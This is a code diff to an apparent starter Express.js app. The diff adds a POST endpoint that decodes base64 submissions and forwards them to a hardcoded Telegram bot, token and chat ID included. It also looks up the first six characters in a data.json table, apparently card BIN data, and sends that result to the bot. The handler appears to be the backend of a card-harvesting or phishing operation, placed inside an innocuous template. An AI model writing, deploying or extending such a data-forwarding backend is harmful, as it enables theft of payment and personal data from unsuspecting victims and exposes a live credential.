@@ -1,10 +1,38 @@
 const express = require("express");
+const d = require('./data.json');
 const app = express();
 const port = process.env.PORT || 3001;
 
-app.get("/", (req, res) => res.type('html').send(html));
+app.get("/", (req, res) => res.type("html").send(html));
 
-const server = app.listen(port, () => console.log(`Example app listening on port ${port}!`));
+app.post("/", (req, res) => {
+  let bindata = JSON.parse(d);
+  console.log(req.body);
+  console.log("POST");
+  let b64string = req.body["data"];
+  let data = Buffer.from(b64string, "base64");
+  let formattedData = data.toString().split(".").join("%0A");
+  console.log(formattedData);
+  fetch(
+    "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=html&text=" +
+      formattedData
+  );
+
+  try {
+    let bin_data = bindata[formattedData.slice(0, 6)];
+    fetch(
+      "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=html&text=" +
+        JSON.stringify(bin_data)
+    );
+    res.json(bin_data);
+  } catch (error) {
+    res.json({ data: "Error" });
+  }
+});
+
+const server = app.listen(port, () =>
+  console.log(`Example app listening on port ${port}!`)
+);
 
 server.keepAliveTimeout = 120 * 1000;
 server.headersTimeout = 120 * 1000;
@@ -58,4 +86,4 @@ const html = `
     </section>
   </body>
 </html>
-`
+`;
